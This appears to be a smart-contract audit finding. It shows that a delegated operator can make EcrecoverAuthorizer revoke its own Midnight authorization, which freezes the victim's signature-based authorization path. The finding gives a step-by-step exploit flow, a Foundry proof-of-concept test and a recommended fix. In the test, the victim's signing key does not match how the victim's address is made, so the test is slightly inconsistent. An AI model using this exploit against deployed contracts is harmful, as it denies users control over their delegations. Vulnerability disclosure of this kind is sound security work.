### Title
Authorized Operator Can Revoke EcrecoverAuthorizer's Own Midnight Authorization via Signed Message - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts any signer who is Midnight-authorized by the `authorization.authorizer`, with no restriction on what `authorization.authorized` may be. An operator holding `isAuthorized[victim][operator] == true` can therefore sign an `Authorization{authorizer: victim, authorized: address(ecrecoverAuthorizer), isAuthorized: false}` and submit it, causing `EcrecoverAuthorizer` to call `midnight.setIsAuthorized(address(ecrecoverAuthorizer), false, victim)` — revoking its own delegation. After this, every future `EcrecoverAuthorizer.setIsAuthorized` call on behalf of the victim will revert with `Unauthorized` inside `Midnight`, because `Midnight.setIsAuthorized` requires `isAuthorized[victim][address(ecrecoverAuthorizer)]` to be true.

**Preconditions:**
- `isAuthorized[victim][operator] == true`
- `isAuthorized[victim][address(ecrecoverAuthorizer)] == true`

**Exploit flow:**

1. Operator constructs `Authorization{authorizer: victim, authorized: address(ecrecoverAuthorizer), isAuthorized: false, nonce: nonce[victim], deadline: future}` and signs it with their own key.
2. Operator (or anyone) calls `EcrecoverAuthorizer.setIsAuthorized(auth, sig)`.
3. Signature check: `signer == operator`, `authorization.authorizer == victim`. `operator != victim`, so falls through to `IMidnight(MIDNIGHT).isAuthorized(victim, operator)` → `true`. **Check passes.**
4. `EcrecoverAuthorizer` calls `midnight.setIsAuthorized(address(ecrecoverAuthorizer), false, victim)` with `msg.sender = address(ecrecoverAuthorizer)`.
5. Inside `Midnight`: `onBehalf == victim`, `msg.sender == address(ecrecoverAuthorizer)`. Checks `isAuthorized[victim][address(ecrecoverAuthorizer)]` → still `true` at this moment. **Check passes.**
6. State written: `isAuthorized[victim][address(ecrecoverAuthorizer)] = false`.

**Why no existing check stops it:**

There is no guard in `EcrecoverAuthorizer` preventing `authorization.authorized == address(this)`. The signer-authorization check only verifies the signer is permitted to act on behalf of `authorization.authorizer`; it does not restrict which `authorized` address can be targeted or in which direction. The `Midnight.setIsAuthorized` check passes because `EcrecoverAuthorizer` is still authorized at the moment it makes the call (the revocation happens inside that very call). [4](#0-3) 

### Impact Explanation

After the attack, every subsequent call to `EcrecoverAuthorizer.setIsAuthorized` on behalf of `victim` — regardless of whether the signer is `victim` themselves or any other authorized party — will reach `Midnight.setIsAuthorized` with `msg.sender = address(ecrecoverAuthorizer)` and `onBehalf = victim`, and revert with `Unauthorized` because `isAuthorized[victim][address(ecrecoverAuthorizer)]` is now `false`. The victim's entire sig-based authorization path through `EcrecoverAuthorizer` is frozen. Recovery requires the victim to submit a direct on-chain transaction to `midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim)`.

### Likelihood Explanation

The precondition that `isAuthorized[victim][operator] == true` is the normal intended state for any user who has delegated to an operator. The precondition that `isAuthorized[victim][address(ecrecoverAuthorizer)] == true` is the normal intended state for any user who has opted into sig-based authorization. Both conditions are expected to hold simultaneously for any user relying on `EcrecoverAuthorizer`. The attack is a single transaction, is repeatable (operator can re-revoke after victim re-enables), and requires no special resources beyond holding an authorized key.

### Recommendation

Add a guard in `EcrecoverAuthorizer.setIsAuthorized` that prevents an operator (non-authorizer signer) from revoking `EcrecoverAuthorizer`'s own authorization:

```solidity
require(
    signer == authorization.authorizer ||
    !(authorization.authorized == address(this) && !authorization.isAuthorized),
    SelfRevocationForbidden()
);
```

Or more precisely, disallow any `Authorization` where `authorized == address(this) && isAuthorized == false` unless the signer is `authorization.authorizer` themselves:

```solidity
if (authorization.authorized == address(this) && !authorization.isAuthorized) {
    require(signer == authorization.authorizer, Unauthorized());
}
```

This ensures only the victim themselves — not a delegated operator — can revoke `EcrecoverAuthorizer`'s own delegation. [1](#0-0) 

### Proof of Concept

```solidity
function testOperatorRevokesEcrecoverAuthorizerSelf() public {
    address victim = makeAddr("victim");
    uint256 operatorKey = 0xBEEF;
    address operator = vm.addr(operatorKey);

    // Setup: victim authorizes operator and ecrecoverAuthorizer in Midnight
    vm.startPrank(victim);
    midnight.setIsAuthorized(operator, true, victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    vm.stopPrank();

    assertEq(midnight.isAuthorized(victim, address(ecrecoverAuthorizer)), true);

    // Operator constructs Authorization to revoke ecrecoverAuthorizer's own delegation
    Authorization memory auth = Authorization({
        authorizer: victim,
        authorized: address(ecrecoverAuthorizer),
        isAuthorized: false,
        nonce: ecrecoverAuthorizer.nonce(victim),
        deadline: block.timestamp + 1 days
    });
    Signature memory sig = signAuthorization(auth, operatorKey);

    // Operator (or anyone) submits — no caller restriction
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // EcrecoverAuthorizer's own authorization is now revoked
    assertEq(midnight.isAuthorized(victim, address(ecrecoverAuthorizer)), false);

    // Victim tries to use EcrecoverAuthorizer for a future sig-based change
    uint256 victimKey = 0xDEAD;
    // (assume victim was created with this key for the test)
    Authorization memory auth2 = Authorization({
        authorizer: victim,
        authorized: makeAddr("newOperator"),
        isAuthorized: true,
        nonce: ecrecoverAuthorizer.nonce(victim),
        deadline: block.timestamp + 1 days
    });
    Signature memory sig2 = signAuthorization(auth2, victimKey);

    // Reverts with Unauthorized from Midnight — victim's sig-based path is frozen
    vm.expectRevert(IMidnight.Unauthorized.selector);
    ecrecoverAuthorizer.setIsAuthorized(auth2, sig2);
}
```

Expected assertion: the final `ecrecoverAuthorizer.setIsAuthorized` call reverts with `IMidnight.Unauthorized`, confirming the victim's sig-based authorization path is permanently frozen until they submit a direct on-chain recovery transaction.

    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
